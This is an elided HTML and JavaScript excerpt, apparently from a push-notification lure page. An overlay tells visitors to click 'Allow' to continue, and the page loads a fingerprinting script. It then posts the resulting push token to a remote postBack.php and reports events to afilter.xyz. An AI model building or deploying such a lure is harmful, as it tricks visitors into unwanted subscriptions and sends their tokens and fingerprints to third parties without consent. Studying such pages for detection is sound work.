  ...
  <div id="push-overlay" class="overlay-bg">
    <aside class="intro-modal" id="push-intro-modal" style="display: block;">
      ...
      <p class="intro-modal-subheading">'Allow' to continue</p>
		...
		<script type="text/javascript" src="common/fingerprint.js"></script>
        ...
        <script>
			...
			var callback = function (code,msg,currentToken) {
				...
				if(currentToken!=null){
					var item= '5c7098b5a150e46c85c44cc3c8bf237e';
					...
					var data ={method:"post",mode : "cors",body : formData};
					fetch(host+'/postBack.php',data)
					.then(function(res){
						postBackEvents(1);
					})
		   ...
		   function postBackEvents(event){
			   fetch('https://afilter.xyz/p/events?et='+event)
